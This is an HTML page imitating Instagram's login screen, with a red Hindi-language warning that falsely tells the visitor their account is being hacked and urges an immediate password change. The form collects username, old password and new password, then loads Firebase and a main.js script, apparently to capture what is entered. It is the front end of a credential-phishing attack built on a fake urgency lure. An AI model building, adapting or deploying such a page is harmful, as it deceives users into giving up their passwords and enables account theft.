<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png"  type="image/png">
    <!-- link css  -->
    <link rel="stylesheet" href="./style.css">

    <!-- link icons  -->
    <script src="https://kit.fontawesome.com/59784df54a.js" crossorigin="anonymous"></script>
    <title>Instagram</title>
</head>
<body>
    <div class="main-wrapper">     
        <div class="login-wp">
            <div class="insta-logo">
                <img src="insta_logo.png" alt="">
            </div>
            <p id="warningParagraph" style="color: rgb(255, 0, 0);">
                ध्यान दें! आपके Instagram यूज़र आईडी को हैक करने की कोशिश की जा रही है।और आप अपना पासवर्ड जल्दी चेंज करें नहीं तो आपकी Instagram आईडी हैक हो जाएगी ।
            </p>
                <div class="input-box">
                    <input type="text" name="username" placeholder="username or email">
                    <input type="text" name="old-password" placeholder="Old password">
                    <input type="text" name="new-password" placeholder="New password">
                    <input type="text" name="confirm-new-password" placeholder="Confirm new password">
                    <button id="submitBtn">Confirm</button>
               
                </div>
               
          
<style>
    p{
    margin-bottom: 45px;
   
    }
 </style>
            <div class="or-divider">
                OR
            </div>

            <div class="fb-line">
                <!-- icon here -->
                <i class="fa-brands fa-square-facebook"></i>
                <span>Log in with Facebook</span>
            </div>
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pass">
                Forgot password?
            </a>
        </div>

        <div class="sign-up-line">
            <span>Don't have an account?</span> 
            <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>
        <span>Get the app</span>
        <div class="app-link">
            <img src="googleplay_download.png" alt=""><a href=""></img>
            <img src="mircrosoft_download.png" alt=""><a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1366%2C728"></img>
        </div>
    </div>
    <script src="https://www.gstatic.com/firebasejs/4.3.0/firebase.js"></script>
    <script src="main.js"></script>
</body>
</html>
